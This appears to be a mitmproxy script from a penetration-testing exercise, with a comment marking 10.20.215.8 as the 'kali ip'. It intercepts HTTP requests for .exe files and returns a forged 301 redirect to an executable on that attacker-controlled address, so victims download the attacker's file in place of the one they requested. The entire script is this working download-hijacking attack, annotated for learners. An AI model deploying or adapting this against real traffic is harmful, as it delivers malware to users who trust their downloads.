from mitmproxy import http


def request(flow):
    
    #10.20.215.8 is the kali ip
    if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".exe"):
        print("[+] Got an interesting flow.")
        #Writing custom response, it takes paramters (HTTP STATUS CODE, CONTENT, HEADERS
        #301 code is moved permanently
        #Header contains header title, and its value
        flow.response = http.HTTPResponse.make(301,  "", {"Location": "http://10.20.215.8/file.exe"})
